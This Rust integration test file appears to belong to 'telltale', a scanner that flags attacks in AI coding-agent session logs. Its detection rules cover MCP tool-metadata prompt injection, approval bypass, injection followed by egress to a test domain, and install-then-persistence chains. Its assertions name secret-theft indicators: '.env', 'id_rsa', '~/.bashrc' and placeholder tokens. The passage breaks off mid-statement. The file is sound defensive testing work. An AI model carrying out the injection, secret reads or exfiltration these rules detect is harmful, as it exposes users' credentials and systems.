use super::*;

fn source_inventory_change_value(event: &Value) -> &str {
    event["evidence"]
        .as_array()
        .expect("evidence array")
        .iter()
        .find(|item| item["field"] == "source_inventory_change")
        .expect("source inventory change evidence")["redacted_value"]
        .as_str()
        .expect("source inventory change value")
}

static WATCH_PROCESS_MUTEX: std::sync::Mutex<()> = std::sync::Mutex::new(());

fn watch_process_guard() -> std::sync::MutexGuard<'static, ()> {
    WATCH_PROCESS_MUTEX
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn assert_source_processing_accounting(summary: &Value) {
    let source_processing = &summary["source_processing"];
    assert_eq!(
        source_processing["selected_source_count"].as_u64().unwrap(),
        source_processing["parse_success_source_count"]
            .as_u64()
            .unwrap()
            + source_processing["empty_source_count"].as_u64().unwrap()
            + source_processing["parse_error_source_count"]
                .as_u64()
                .unwrap()
    );
    let record_kind_counts = source_processing["record_kind_counts"]
        .as_object()
        .expect("record kind counts");
    let mut keys = record_kind_counts
        .keys()
        .map(String::as_str)
        .collect::<Vec<_>>();
    keys.sort_unstable();
    assert_eq!(
        keys,
        vec![
            "assistant_message",
            "other",
            "session_meta",
            "tool_call",
            "tool_result",
            "user_message",
        ]
    );
    let parsed_record_count = source_processing["parsed_record_count"].as_u64().unwrap();
    assert_eq!(
        parsed_record_count,
        record_kind_counts
            .values()
            .map(|count| count.as_u64().unwrap())
            .sum::<u64>()
    );
    assert!(record_kind_counts["user_message"].as_u64().unwrap() > 0);
    assert!(record_kind_counts["tool_call"].as_u64().unwrap() > 0);
}

fn assert_detection_flow_accounting(summary: &Value, emitted: u64, deduplicated: u64) {
    let detection_flow = &summary["detection_flow"];
    assert_eq!(
        detection_flow["effective_detection_candidate_count"],
        Value::from(emitted + deduplicated)
    );
    assert_eq!(
        detection_flow["state_deduplicated_detection_count"],
        Value::from(deduplicated)
    );
    assert_eq!(
        detection_flow["emitted_detection_count"],
        Value::from(emitted)
    );
    assert!(detection_flow["matched_rule_id_count"].as_u64().unwrap() > 0);
    assert_eq!(detection_flow["allowlist_marked_detection_count"], 0);
    assert_eq!(
        detection_flow["policy_match_accounting"]["status"],
        "not_applicable"
    );
    for field in [
        "pre_policy_detection_candidate_count",
        "fully_filtered_detection_candidate_count",
        "filtered_rule_id_count",
    ] {
        assert!(
            detection_flow["policy_match_accounting"][field].is_null(),
            "{field} should be unavailable"
        );
    }
}

fn assert_runtime_snapshot(summary: &Value) {
    let executable = Path::new(env!("CARGO_BIN_EXE_telltale"));
    let mut file = fs::File::open(executable).expect("open invoked executable");
    let mut bytes = Vec::new();
    file.read_to_end(&mut bytes)
        .expect("read invoked executable");
    let mut hasher = sha2::Sha256::new();
    hasher.update(&bytes);
    assert_eq!(
        summary["runtime"]["package_version"],
        env!("CARGO_PKG_VERSION")
    );
    assert_eq!(
        summary["runtime"]["build_git_hash"],
        env!("TELLTALE_GIT_HASH")
    );
    assert_eq!(
        summary["runtime"]["executable"]["observation_status"],
        "complete"
    );
    assert_eq!(
        summary["runtime"]["executable"]["path_hash"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
    assert_eq!(
        summary["runtime"]["executable"]["path_hash"],
        path_hash(executable)
    );
    assert_eq!(
        summary["runtime"]["executable"]["sha256"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
    assert!(
        summary["runtime"]["executable"]["sha256"]
            .as_str()
            .unwrap()
            .bytes()
            .all(|byte| byte.is_ascii_hexdigit())
    );
    assert_eq!(
        summary["runtime"]["executable"]["sha256"],
        format!("{:x}", hasher.finalize())
    );
}

#[test]
fn scan_once_writes_schema_shaped_health_jsonl() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["event_type"], "health");
    assert_eq!(summary["detection_count"], 36);
    assert_runtime_snapshot(&summary);
    assert_eq!(
        summary["effective_configuration"]["local_config"]["mode"],
        "disabled"
    );
    assert_eq!(
        summary["effective_configuration"]["outputs"]["mode"],
        "legacy_default"
    );
    assert_eq!(
        summary["effective_configuration"]["outputs"]["sinks"][0]["origin_kind"],
        "legacy_default"
    );
    assert_eq!(
        summary["effective_configuration"]["rules"]["default_enabled"],
        true
    );
    assert_eq!(
        summary["effective_configuration"]["rules"]["sources"]
            .as_array()
            .unwrap()
            .len(),
        1
    );
    assert_source_processing_accounting(&summary);
    assert_detection_flow_accounting(&summary, 36, 0);
    assert_eq!(summary["source_processing"]["selected_source_count"], 69);
    assert_eq!(summary["source_discovery"]["basis"], "current_full_scan");
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert_eq!(summary["source_discovery"]["checked_status"], "succeeded");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        Value::Null
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        false
    );
    assert_eq!(summary["source_discovery"]["returned_source_count"], 69);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 69);
    assert_eq!(
        summary["source_discovery"]["project_configuration"],
        serde_json::json!({
            "mode": "none",
            "document_attempt_count": 0,
            "document_success_count": 0,
            "document_failure_count": 0,
            "loaded_project_count": 0,
        })
    );
    assert_eq!(summary["diagnostic_warnings"], serde_json::json!([]));
    assert_eq!(
        summary["source_processing"]["parse_success_source_count"],
        68
    );
    assert_eq!(summary["source_processing"]["empty_source_count"], 1);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    assert_eq!(summary["source_processing"]["parsed_record_count"], 147);
    assert_eq!(
        summary["source_processing"]["record_kind_counts"],
        serde_json::json!({
            "user_message": 25,
            "assistant_message": 27,
            "tool_call": 31,
            "tool_result": 20,
            "session_meta": 44,
            "other": 0,
        })
    );
    assert_eq!(summary["detection_flow"]["matched_rule_id_count"], 124);
    assert_eq!(summary["source_counts"]["claude.jsonl"], 3);
    assert_eq!(summary["source_counts"]["codex.jsonl"], 40);
    assert_eq!(summary["source_counts"]["codex.archived_jsonl"], 2);
    assert_eq!(summary["source_counts"]["codex.headless_jsonl"], 2);
    assert_eq!(summary["source_counts"]["gemini.json"], 3);
    assert_eq!(summary["source_counts"]["openclaw.jsonl"], 2);
    assert_eq!(summary["source_counts"]["qwen.jsonl"], 2);
    assert_eq!(summary["source_counts"]["roocode.ui_messages_json"], 2);
    assert_eq!(summary["source_counts"]["kilocode.ui_messages_json"], 2);
    assert_eq!(summary["source_counts"]["opencode.sqlite"], 1);
    assert_eq!(summary["source_counts"]["opencode.legacy_json"], 5);
    assert_eq!(summary["source_counts"]["copilot.copilot_process_log"], 5);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert_eq!(events.len(), 38);
    assert!(events.iter().all(|event| {
        event.get("source_processing").is_none()
            && event.get("detection_flow").is_none()
            && event.get("source_discovery").is_none()
            && event.get("diagnostic_warnings").is_none()
            && event.get("runtime").is_none()
            && event.get("effective_configuration").is_none()
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "activity"
            && event["check_name"] == "install_inventory"
            && event["client"] == "install_inventory"
            && event["tags"]
                .as_array()
                .expect("tags")
                .iter()
                .any(|tag| tag == "install_inventory")
    }));
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "session-a" && event["client"] == "claude")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "claude-tool-use" && event["client"] == "claude")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "gemini-session-a" && event["client"] == "gemini")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "qwen-session-a" && event["client"] == "qwen")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "openclaw-session-a"
                && event["client"] == "openclaw")
    );
    assert!(
        !events.iter().any(
            |event| event["session_id"] == "roocode-session-a" && event["client"] == "roocode"
        )
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "kilocode-session-a"
                && event["client"] == "kilocode")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "approval-bypass-quoted-example")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-normal-mcp")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "controlled-domain-user-text")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "controlled-domain-assistant-text")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-server-instructions")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-tools-list")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-domain-only")
    );

    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    for event in &events {
        assert!(
            validator.is_valid(event),
            "event failed schema validation: {}",
            event["session_id"]
                .as_str()
                .unwrap_or("<missing session_id>")
        );
        for item in event["evidence"].as_array().expect("evidence array") {
            let redacted = item["redacted_value"].as_str().expect("redacted value");
            assert!(
                item["hash"].is_string(),
                "evidence hash missing for {}",
                event["session_id"]
                    .as_str()
                    .unwrap_or("<missing session_id>")
            );
            assert!(!redacted.contains(".env"));
            assert!(!redacted.contains("darkroastcyber.io"));
            assert!(!redacted.contains("mcp-lab"));
            assert!(!redacted.contains("id_rsa"));
            assert!(!redacted.contains("ghp_1234567890abcdef1234"));
            assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ"));
            assert!(!redacted.contains("fixture_session_token_1234567890abcdef"));
        }
    }

    let event = &events[0];
    assert!(
        validator.is_valid(event),
        "health event failed schema validation"
    );
    assert_eq!(event["schema_version"], "3.0");
    assert_eq!(event["event_type"], "health");
    assert_eq!(event["severity"], "informational");
    assert_eq!(event["risk_score"], 0);
    assert_eq!(event["session_id"], "scanner");
    assert_eq!(event["component"], "scanner");
    assert_eq!(event["check_name"], "source_discovery");
    assert_eq!(event["status"], "ok");
    assert_eq!(event["telltale_version"], env!("CARGO_PKG_VERSION"));
    assert!(event["scan_duration_ms"].as_u64().is_some());
    assert_eq!(event["rule_count"], 18);
    assert_eq!(event["emitted_count"], 37);
    assert_eq!(event["suppressed_count"], 0);
    assert_eq!(event["scanner_error_count"], 0);
    assert_eq!(event["threshold_config"]["low"], 20);
    assert_eq!(event["threshold_config"]["medium"], 50);
    assert_eq!(event["threshold_config"]["high"], 70);
    assert_eq!(event["threshold_config"]["critical"], 90);
    assert!(event.get("active_policy_name").is_none());
    assert!(
        event["evidence"]
            .as_array()
            .is_some_and(|items| !items.is_empty())
    );
    assert_eq!(
        event["evidence"].as_array().expect("health evidence").len(),
        2
    );
    assert_eq!(event["evidence"][0]["field"], "source_inventory");
    assert_eq!(
        event["evidence"][0]["redacted_value"],
        "sources=69; client_source_kinds=12"
    );
    assert!(
        event["evidence"][0]["hash"]
            .as_str()
            .is_some_and(|hash| hash.len() == 64)
    );
    assert_eq!(event["evidence"][1]["field"], "source_inventory_change");
    assert_eq!(
        event["evidence"][1]["redacted_value"],
        "baseline=true; added=69; removed=0; unchanged=0"
    );
    assert!(
        event["evidence"][1]["hash"]
            .as_str()
            .is_some_and(|hash| hash.len() == 64)
    );
    for item in event["evidence"].as_array().expect("evidence array") {
        let redacted = item["redacted_value"].as_str().expect("redacted value");
        assert!(!redacted.contains("tests/fixtures"));
        assert!(!redacted.contains(".jsonl"));
        assert!(!redacted.contains(".sqlite"));
    }

    let detection = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive")
        .expect("uc001 detection");
    assert!(
        validator.is_valid(detection),
        "detection event failed schema validation"
    );
    assert_eq!(detection["event_type"], "detection");
    assert_eq!(detection["severity"], "critical");
    assert_eq!(detection["session_id"], "uc001-positive");
    assert_eq!(detection["tool_name"], "repo_status");
    assert!(
        detection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        detection["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );

    let server_instructions = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-server-instructions")
        .expect("server instructions detection");
    assert!(
        validator.is_valid(server_instructions),
        "server instructions event failed schema validation"
    );
    assert_eq!(server_instructions["event_type"], "detection");
    assert_eq!(server_instructions["severity"], "critical");
    assert!(
        server_instructions["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        server_instructions["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "mcp_prompt_injection")
    );
    assert!(
        server_instructions["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );

    let tool_description = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-tool-description")
        .expect("tool description detection");
    assert!(
        validator.is_valid(tool_description),
        "tool description event failed schema validation"
    );
    assert_eq!(tool_description["event_type"], "detection");
    assert_eq!(tool_description["severity"], "critical");
    assert!(
        tool_description["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        tool_description["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );

    let parameter_description = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-parameter-description")
        .expect("parameter description detection");
    assert!(
        validator.is_valid(parameter_description),
        "parameter description event failed schema validation"
    );
    assert_eq!(parameter_description["event_type"], "detection");
    assert_eq!(parameter_description["severity"], "critical");
    assert!(
        parameter_description["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        parameter_description["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );

    let compliance_tool = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-compliance-tool")
        .expect("compliance tool detection");
    assert!(
        validator.is_valid(compliance_tool),
        "compliance tool event failed schema validation"
    );
    assert_eq!(compliance_tool["event_type"], "detection");
    assert_eq!(compliance_tool["severity"], "critical");
    assert_eq!(compliance_tool["tool_name"], "get_compliance_status");
    assert!(
        compliance_tool["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        compliance_tool["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        compliance_tool["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let reversed_injection = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-reversed-injection")
        .expect("reversed injection detection");
    assert!(
        validator.is_valid(reversed_injection),
        "reversed injection event failed schema validation"
    );
    assert_eq!(reversed_injection["event_type"], "detection");
    assert_eq!(reversed_injection["severity"], "critical");
    assert_eq!(reversed_injection["tool_name"], "repo_status");
    assert!(
        reversed_injection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        reversed_injection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        reversed_injection["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let tool_result = events
        .iter()
        .find(|event| event["session_id"] == "tool-result-injection")
        .expect("tool result detection");
    assert!(
        validator.is_valid(tool_result),
        "tool result event failed schema validation"
    );
    assert_eq!(tool_result["event_type"], "detection");
    assert_eq!(tool_result["severity"], "critical");
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "approval.bypass.context")
    );
    assert!(
        tool_result["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "approval_bypass")
    );
    assert!(
        !tool_result["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
    );
    assert!(
        tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );

    let claude_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "claude-uc001-tool-result")
        .expect("claude tool result detection");
    assert!(
        validator.is_valid(claude_tool_result),
        "claude tool result event failed schema validation"
    );
    assert_eq!(claude_tool_result["event_type"], "detection");
    assert_eq!(claude_tool_result["client"], "claude");
    assert_eq!(claude_tool_result["severity"], "critical");
    assert_eq!(claude_tool_result["tool_name"], "repo_status");
    assert!(
        claude_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        claude_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        claude_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let gemini_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "gemini-uc001-tool-result")
        .expect("gemini tool result detection");
    assert!(
        validator.is_valid(gemini_tool_result),
        "gemini tool result event failed schema validation"
    );
    assert_eq!(gemini_tool_result["event_type"], "detection");
    assert_eq!(gemini_tool_result["client"], "gemini");
    assert_eq!(gemini_tool_result["severity"], "critical");
    assert_eq!(gemini_tool_result["tool_name"], "repo_status");
    assert!(
        gemini_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        gemini_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        gemini_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let qwen_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "qwen-uc001-tool-result")
        .expect("qwen tool result detection");
    assert!(
        validator.is_valid(qwen_tool_result),
        "qwen tool result event failed schema validation"
    );
    assert_eq!(qwen_tool_result["event_type"], "detection");
    assert_eq!(qwen_tool_result["client"], "qwen");
    assert_eq!(qwen_tool_result["severity"], "critical");
    assert_eq!(qwen_tool_result["tool_name"], "repo_status");
    assert!(
        qwen_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        qwen_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        qwen_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let openclaw_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "openclaw-uc001-tool-result")
        .expect("openclaw tool result detection");
    assert!(
        validator.is_valid(openclaw_tool_result),
        "openclaw tool result event failed schema validation"
    );
    assert_eq!(openclaw_tool_result["event_type"], "detection");
    assert_eq!(openclaw_tool_result["client"], "openclaw");
    assert_eq!(openclaw_tool_result["severity"], "critical");
    assert_eq!(openclaw_tool_result["tool_name"], "repo_status");
    assert!(
        openclaw_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        openclaw_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        openclaw_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let roocode_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "roocode-uc001-tool-result")
        .expect("roocode tool result detection");
    assert!(
        validator.is_valid(roocode_tool_result),
        "roocode tool result event failed schema validation"
    );
    assert_eq!(roocode_tool_result["event_type"], "detection");
    assert_eq!(roocode_tool_result["client"], "roocode");
    assert_eq!(roocode_tool_result["severity"], "critical");
    assert_eq!(roocode_tool_result["tool_name"], "repo_status");
    assert!(
        roocode_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        roocode_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        roocode_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let kilocode_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "kilocode-uc001-tool-result")
        .expect("kilocode tool result detection");
    assert!(
        validator.is_valid(kilocode_tool_result),
        "kilocode tool result event failed schema validation"
    );
    assert_eq!(kilocode_tool_result["event_type"], "detection");
    assert_eq!(kilocode_tool_result["client"], "kilocode");
    assert_eq!(kilocode_tool_result["severity"], "critical");
    assert_eq!(kilocode_tool_result["tool_name"], "repo_status");
    assert!(
        kilocode_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        kilocode_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        kilocode_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let opencode_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "opencode-uc001-legacy-tool-result")
        .expect("opencode legacy tool result detection");
    assert!(
        validator.is_valid(opencode_tool_result),
        "opencode legacy tool result event failed schema validation"
    );
    assert_eq!(opencode_tool_result["event_type"], "detection");
    assert_eq!(opencode_tool_result["client"], "opencode");
    assert_eq!(opencode_tool_result["severity"], "critical");
    assert_eq!(opencode_tool_result["tool_name"], "repo_status");
    assert!(
        opencode_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        opencode_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        opencode_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let opencode_sqlite_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "opencode-uc001-sqlite-tool-result")
        .expect("opencode sqlite tool result detection");
    assert!(
        validator.is_valid(opencode_sqlite_tool_result),
        "opencode sqlite tool result event failed schema validation"
    );
    assert_eq!(opencode_sqlite_tool_result["event_type"], "detection");
    assert_eq!(opencode_sqlite_tool_result["client"], "opencode");
    assert_eq!(opencode_sqlite_tool_result["severity"], "critical");
    assert_eq!(opencode_sqlite_tool_result["tool_name"], "repo_status");
    assert!(
        opencode_sqlite_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        opencode_sqlite_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        opencode_sqlite_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let jwt_bearer_token = events
        .iter()
        .find(|event| event["session_id"] == "jwt-bearer-token-pattern")
        .expect("jwt bearer token detection");
    assert!(
        validator.is_valid(jwt_bearer_token),
        "jwt bearer token event failed schema validation"
    );
    assert_eq!(jwt_bearer_token["event_type"], "detection");
    assert_eq!(jwt_bearer_token["severity"], "low");
    assert!(
        jwt_bearer_token["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "credential.api_key.pattern")
    );
    assert!(
        jwt_bearer_token["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "credential_pattern")
    );
    assert!(
        jwt_bearer_token["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ")
                    && !value.contains("fixture_session_token_1234567890abcdef")
            })
    );

    let tool_injection_session = events
        .iter()
        .find(|event| event["session_id"] == "tool-injection-shape-session")
        .expect("tool injection session detection");
    assert!(
        validator.is_valid(tool_injection_session),
        "tool injection session event failed schema validation"
    );
    assert_eq!(tool_injection_session["event_type"], "detection");
    assert_eq!(tool_injection_session["severity"], "critical");
    assert!(
        tool_injection_session["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "tool.injection.shape")
    );
    assert!(
        tool_injection_session["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.controlled_test_domain.darkroast")
    );
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );
    let approval = events
        .iter()
        .find(|event| event["session_id"] == "approval-bypass-context")
        .expect("approval detection");
    assert!(
        validator.is_valid(approval),
        "approval bypass event failed schema validation"
    );
    assert_eq!(approval["event_type"], "detection");
    assert_eq!(approval["session_id"], "approval-bypass-context");
    assert!(
        approval["rule_ids"]
            .as_array()
            .is_some_and(|rules| { rules.iter().any(|rule| rule == "approval.bypass.context") })
    );
    assert!(approval["categories"].as_array().is_some_and(|categories| {
        categories
            .iter()
            .any(|category| category == "approval_bypass")
    }));

    let install_persistence = events
        .iter()
        .find(|event| event["session_id"] == "install-persistence-chain")
        .expect("install persistence detection");
    assert!(
        validator.is_valid(install_persistence),
        "install persistence event failed schema validation"
    );
    assert_eq!(install_persistence["event_type"], "detection");
    assert_eq!(install_persistence["severity"], "critical");
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "install.package_manager")
    );
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "persistence.shell_profile")
    );
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.install_then_persistence")
    );
    assert!(
        install_persistence["categories"]
            .as_array()
            .is_some_and(|categories| {
                categories.iter().any(|category| category == "install")
                    && categories.iter().any(|category| category == "persistence")
            })
    );
    assert!(
        install_persistence["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("darkroastcyber.io")
                    && !value.contains("pip install")
                    && !value.contains("~/.bashrc")
            })
    );

    let encoded_payload = events
        .iter()
